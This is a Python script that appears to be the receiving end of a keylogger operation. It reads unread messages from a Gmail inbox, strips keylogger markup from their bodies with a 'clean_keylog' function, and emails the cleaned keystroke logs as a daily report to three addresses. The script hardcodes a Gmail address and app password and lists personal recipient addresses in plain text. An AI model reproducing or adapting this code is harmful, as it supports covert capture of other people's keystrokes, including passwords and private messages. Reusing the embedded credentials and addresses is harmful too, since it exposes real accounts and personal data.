import imaplib
import email
from email.header import decode_header
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import datetime
import re

# Email credentials
USERNAME = 'xrmsdkp@gmail.com'
PASSWORD = 'tiei oeda poto mcqp'

# IMAP and SMTP settings
IMAP_SERVER = 'imap.gmail.com'
IMAP_PORT = 993
SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587
RECIPIENTS = ['kurosen930@gmail.com', 'ufraansiddiqui30@gmail.com', 'xrmsdkp@gmail.com']

def clean_keylog(keylog):
    # Convert keylog to a more readable format
    keylog = re.sub(r'\[Key.shift_r\]', '', keylog)
    keylog = re.sub(r'\[CTRL\]', '^', keylog)
    keylog = re.sub(r'\[BACKSPACE\]', '<', keylog)
    keylog = re.sub(r'\[ENTER\]', '\n', keylog)
    keylog = re.sub(r'\[TAB\]', '\t', keylog)
    keylog = re.sub(r'\[ESC\]', '[ESC]', keylog)
    keylog = re.sub(r'\[ALT\]', '[ALT]', keylog)
    keylog = re.sub(r'\[SHIFT\]', '[SHIFT]', keylog)
    return keylog

def fetch_emails():
    # Connect to the server
    mail = imaplib.IMAP4_SSL(IMAP_SERVER)
    mail.login(USERNAME, PASSWORD)
    mail.select('inbox')

    # Search for unread emails
    status, messages = mail.search(None, 'UNSEEN')
    email_ids = messages[0].split()

    report = ""
    if not email_ids:
        report = "No new messages."
    else:
        for e_id in email_ids:
            status, msg_data = mail.fetch(e_id, '(RFC822)')
            msg = email.message_from_bytes(msg_data[0][1])
            subject = decode_header(msg["Subject"])[0][0]
            if isinstance(subject, bytes):
                subject = subject.decode()
            from_ = msg.get("From")
            
            # Fetch the email body
            body = ""
            if msg.is_multipart():
                for part in msg.walk():
                    content_type = part.get_content_type()
                    content_disposition = str(part.get("Content-Disposition"))
                    if "attachment" not in content_disposition:
                        payload = part.get_payload(decode=True)
                        if payload:
                            body += payload.decode(errors='ignore')
            else:
                payload = msg.get_payload(decode=True)
                if payload:
                    body += payload.decode(errors='ignore')
            
            # Clean and format the body
            clean_body = clean_keylog(body)

            report += f"From: {from_}\nSubject: {subject}\nBody:\n{clean_body}\n\n"

            # Mark as read
            mail.store(e_id, '+FLAGS', '\\Seen')

    mail.logout()
    return report

def send_report_via_smtp(report):
    # Create the email
    msg = MIMEMultipart()
    msg['From'] = USERNAME
    msg['To'] = ', '.join(RECIPIENTS)
    msg['Subject'] = f'Daily Email Report - {datetime.date.today()}'

    body = MIMEText(report, 'plain')
    msg.attach(body)

    # Send the email
    try:
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(USERNAME, PASSWORD)
            server.sendmail(USERNAME, RECIPIENTS, msg.as_string())
    except Exception as e:
        print(f"Failed to send email: {e}")

def main():
    try:
        report = fetch_emails()
        send_report_via_smtp(report)
    except Exception as e:
        print(f"Error in script execution: {e}")

if __name__ == '__main__':
    main()
